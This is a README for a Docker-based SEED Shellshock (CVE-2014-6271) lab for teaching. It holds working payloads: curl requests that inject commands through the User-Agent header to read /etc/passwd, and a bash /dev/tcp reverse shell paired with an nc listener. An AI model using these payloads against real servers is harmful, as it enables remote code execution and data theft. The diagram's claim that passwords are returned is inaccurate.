# Lab 05 — Shellshock Vulnerability Lab

**Implementation Type**: Official SEED source adapted for Docker

Official lab manual: https://seedsecuritylabs.org/Labs_20.04/Web/Shellshock/
Textbook: Chapter 3 — Shellshock Attack (*Computer & Internet Security*, 2nd Ed., Prof. Wenliang Du)
Lecture Sync Sitemap: [SEED Lecture & Reference Sitemap](../../docs/lectures-and-references.md#6-lab-05--shellshock-vulnerability)
CVE References: [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271), [CVE-2014-7169](https://nvd.nist.gov/vuln/detail/CVE-2014-7169)

For authorized educational use only.

> **HOST BROWSER ROUTING NOTICE**: Access CGI scripts in host clients via `http://localhost:10086/cgi-bin/vul.cgi`. Do not use internal container IP `10.9.0.80` directly in host clients.  
> **CONTAINER COMMAND FALLBACKS**: If `bash` is missing: `docker exec -it shellshock-10.9.0.80 sh`. If `ip` is missing: `hostname -i`. If `ss` is missing: `netstat -tlnp`.

---

---

## 📖 The Shellshock Story: The Apache CGI Environment Flaw

### Act 1 — The Web Server & CGI Scripts
* The target server at **`http://localhost:10086/cgi-bin/vul.cgi`** runs Apache 2.4 configured with mod_cgi.
* When a client sends an HTTP request to a CGI script, Apache passes incoming request headers (such as `User-Agent`, `Referer`, `Cookie`) to the child process as environment variables (e.g. `HTTP_USER_AGENT`).

### Act 2 — The Vulnerability (Bash Function Parsing Bug — CVE-2014-6271)
* Older versions of GNU Bash (through 4.3) allow exporting function definitions via environment variables:
  ```bash
  export MY_FUNC="() { echo 'hello'; }"
  ```
* **The Bug:** Due to a parsing error in `variables.c`, Bash does not stop parsing when the function definition ends. If trailing shell commands follow the function definition, Bash **immediately executes them** upon starting!
  ```bash
  export EVIL="() { :; }; echo 'EXPLOITED'; /bin/cat /etc/passwd"
  ```

### Act 3 — Remote Code Execution via HTTP
* The attacker sends a crafted HTTP request with the Shellshock payload inside the `User-Agent` header.
* Apache assigns the header to `HTTP_USER_AGENT` and spawns `/bin/bash` to execute `vul.cgi`.
* Bash starts, parses the environment variable, and executes the attacker's commands with `www-data` privileges!

```mermaid
sequenceDiagram
    autonumber
    actor Attacker as 🕵️ Attacker
    participant Apache as 🌐 Apache Web Server (10.9.0.80)
    participant CGI as ⚙️ vul.cgi (Bash 4.3)

    Attacker->>Apache: 1. GET /cgi-bin/vul.cgi<br>User-Agent: () { :; }; /bin/cat /etc/passwd
    Note over Apache: Sets env: HTTP_USER_AGENT="() { :; }; /bin/cat /etc/passwd"
    Apache->>CGI: 2. Spawns vulnerable Bash shell
    Note over CGI: Bash parses function & immediately executes /bin/cat /etc/passwd!
    CGI-->>Apache: 3. Outputs /etc/passwd file content
    Apache-->>Attacker: 4. Returns root & system passwords in HTTP response!
```

---

## 🧪 Official Lab Tasks Walkthrough

### Task 1 — Testing Shellshock Locally
Run the vulnerability test inside the container:
```powershell
docker exec -it shellshock-10.9.0.80 /bin/bash_shellshock -c 'foo="() { :; }; echo VULNERABLE" bash_shellshock -c "echo test"'
```
* If the output prints `VULNERABLE`, the shell is susceptible to CVE-2014-6271.

### Task 2 — Remote Attack via HTTP User-Agent Header
Send an HTTP request with the injection payload:
```powershell
curl.exe -H "User-Agent: () { :; }; echo Content_type: text/plain; echo; echo; /bin/ls -la /" http://localhost:10086/cgi-bin/vul.cgi
```

### Task 3 — Exfiltrating Confidential Data
Read system passwords or server configuration files:
```powershell
curl.exe -H "User-Agent: () { :; }; echo Content_type: text/plain; echo; echo; /bin/cat /etc/passwd" http://localhost:10086/cgi-bin/vul.cgi
```

### Task 4 — Spawning an Interactive Reverse Shell
1. On the attacker machine / host, start a Netcat listener:
   ```bash
   nc -lvp 9090
   ```
2. Trigger the reverse shell payload:
   ```powershell
   curl.exe -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.9.0.1/9090 0>&1" http://localhost:10086/cgi-bin/vul.cgi
   ```
3. An interactive root/web shell connects back to the listener.

### Task 5 — Defense & Remediation
* Patch the Bash binary to a modern version (>= 4.4).
* Test the patched CGI script at `http://localhost:10086/cgi-bin/safe.cgi` to verify that trailing commands are ignored.

---

## Container Architecture

```
HOST MACHINE
  |
  | Port 10086 -> shellshock-10.9.0.80:80
  |
  Docker Bridge Network: net-10.9.0.0-shellshock (10.9.0.0/24)
    |
    +---- shellshock-10.9.0.80   (Apache 2.4 + CGI scripts + bash_shellshock)
```

---

## Layer 1 — Docker Commands (host terminal)

```bash
cd labs/05-shellshock
.\start.ps1       # Windows PowerShell
./start.sh        # Linux / WSL2 bash
```

---

## Layer 2 — Linux Commands (inside the container)

```bash
docker exec -it shellshock-10.9.0.80 bash
/bin/bash_shellshock -c 'foo="() { :; }; echo VULNERABLE" bash_shellshock -c "echo test"'
cd /usr/lib/cgi-bin
ls -la
exit
```

---

## Layer 3 — Security Tasks

```powershell
# Windows PowerShell RCE payload execution
curl.exe -A "() { :; }; echo Content-Type: text/plain; echo; /bin/cat /etc/passwd" http://localhost:10086/cgi-bin/vul.cgi
```

---

## Stop and Reset

```bash
docker compose down
docker compose down -v
```
